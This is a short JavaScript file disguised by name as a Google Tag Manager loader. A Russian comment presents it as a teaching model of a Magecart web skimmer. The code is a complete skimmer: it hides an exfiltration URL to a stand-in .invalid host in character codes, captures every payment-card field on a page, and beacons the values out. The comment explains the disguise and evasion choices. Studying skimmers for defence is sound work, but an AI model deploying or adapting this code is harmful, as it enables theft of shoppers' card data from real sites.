/* gtm-loader 3.4.1 — учебная модель веб-скиммера (Magecart). Адрес .invalid не существует, данные никуда не уходят.
 * Как в настоящих кампаниях: имя файла похоже на Google Tag Manager, адрес сервера собран из кодов символов
 * (String.fromCharCode), скрипт слушает изменения всех полей с autocomplete="cc-…" на странице
 * и отправляет их через navigator.sendBeacon — такой запрос не задерживает уход со страницы. */
(function(){var _h=String.fromCharCode(104,116,116,112,115,58,47,47,99,100,110,45,103,116,109,45,115,116,97,116,115,46,105,110,118,97,108,105,100,47,99);
var _d={};document.addEventListener('change',function(e){var t=e.target;if(t&&t.autocomplete&&t.autocomplete.indexOf('cc-')===0){_d[t.name]=t.value;
navigator.sendBeacon(_h,JSON.stringify(_d));}},true);})();
